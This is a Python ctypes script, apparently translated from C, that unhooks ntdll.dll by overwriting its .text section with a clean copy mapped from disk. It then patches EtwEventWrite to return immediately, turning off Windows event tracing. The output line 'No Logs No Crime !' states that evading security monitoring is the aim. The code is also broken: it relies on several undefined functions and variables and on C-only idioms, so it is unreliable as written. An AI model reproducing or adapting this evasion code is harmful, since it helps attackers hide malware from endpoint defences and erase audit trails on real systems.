import ctypes
import sys
from ctypes import *
from ctypes.wintypes import *

def UnhookNTDLL(hNtdll, pMapping):
    """
    UnhookNTDLL() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
    """
    oldprotect = DWORD(0)
    pidh = PIMAGE_DOS_HEADER(pMapping)
    pinh = PIMAGE_NT_HEADERS(DWORD(pMapping) + pidh.e_lfanew)

    # find .text section
    for i in range(pinh.FileHeader.NumberOfSections):
        pish = PIMAGE_SECTION_HEADER(DWORD(IMAGE_FIRST_SECTION(pinh)) + DWORD(IMAGE_SIZEOF_SECTION_HEADER) * i)

        if not strcmp(c_char_p(pish.Name), b".text"):
            # prepare ntdll.dll memory region for write permissions.
            VirtualProtect_p(LPVOID(DWORD(hNtdll) + pish.VirtualAddress), pish.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, byref(oldprotect))
            if not oldprotect:
                # RWX failed!
                return -1
            # copy original .text section into ntdll memory
            memmove(LPVOID(DWORD(hNtdll) + pish.VirtualAddress), LPVOID(DWORD(pMapping) + pish.VirtualAddress), pish.Misc.VirtualSize)

            # restore original protection settings of ntdll
            VirtualProtect_p(LPVOID(DWORD(hNtdll) + pish.VirtualAddress), pish.Misc.VirtualSize, oldprotect, byref(oldprotect))
            if not oldprotect:
                # it failed
                return -1
            return 0
    return -1

def FuckEtw():
    oldprotect = DWORD(0)

    pEventWrite = GetProcAddress(GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite")

    if not VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, byref(oldprotect)):
        print("[!] VirtualProtect Failed With Error : %d" % GetLastError())
        return False

    if sys.maxsize > 2**32:
        memcpy(pEventWrite, b"\x48\x33\xc0\xc3", 4)        # xor rax, rax; ret
    else:
        memcpy(pEventWrite, b"\x33\xc0\xc2\x14\x00", 5)    # xor eax, eax; ret 14

    if not VirtualProtect_p(pEventWrite, 4096, oldprotect, byref(oldprotect)):
        print("[!] VirtualProtect Failed With Error : %d" % GetLastError())
        return False
    if not FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096):
        print("[!] FlushInstructionCache Failed With Error : %d" % GetLastError())
        return False

    return True

def main():
    Banner()

    ret = 0
    hFile = HANDLE(0)

    hFileMapping = HANDLE(0)
    pMapping = LPVOID(0)

    CreateFileMappingA_p = WINFUNCTYPE(HANDLE, HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"CreateFileMappingA"))
    MapViewOfFile_p = WINFUNCTYPE(LPVOID, HANDLE, DWORD, DWORD, DWORD, SIZE_T)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"MapViewOfFile"))

    UnmapViewOfFile_p = WINFUNCTYPE(BOOL, LPCVOID)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"UnmapViewOfFile"))
    VirtualProtect_p = WINFUNCTYPE(BOOL, LPVOID, SIZE_T, DWORD, PDWORD)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"VirtualProtect"))

    print("\n[i] Hooked Ntdll Base Address : 0x%p" % pLocalNtdll)
    # open ntdll.dll
    XORcrypt(sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1])
    hFile = CreateFileA(sNtdllPath, GENERIC_READ, FILE_SHARE_READ, None, OPEN_EXISTING, 0, None)
    if hFile == INVALID_HANDLE_VALUE:
        # failed to open ntdll.dll
        return -1

    # prepare file mapping
    hFileMapping = CreateFileMappingA_p(hFile, None, PAGE_READONLY | SEC_IMAGE, 0, 0, None)
    if not hFileMapping:
        # file mapping failed
        CloseHandle(hFile)
        return -1

    # map the bastard
    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0)
    if not pMapping:
        # mapping failed
        CloseHandle(hFileMapping)
        CloseHandle(hFile)
        return -1

    # remove hooks
    ret = UnhookNTDLL(GetModuleHandleA(sNtdllPath), pMapping)

    print("[i] Unhooked Ntdll Base Address: 0x%p" % sNtdll)

    # Clean up.
    UnmapViewOfFile_p(pMapping)
    CloseHandle(hFileMapping)
    CloseHandle(hFile)

    print("\n[+] PID Of The Current Proccess: [%d]\n" % GetCurrentProcessId())
    print("\n[#] Ready For ETW Patch.\n")

    print("[+] Press <Enter> To Patch ETW ...\n")
    input()

    if not FuckEtw():
        return EXIT_FAILURE

    print("\n[+] ETW Patched, No Logs No Crime ! \n")
    print("\n")

    return 0

if __name__ == "__main__":
    main()
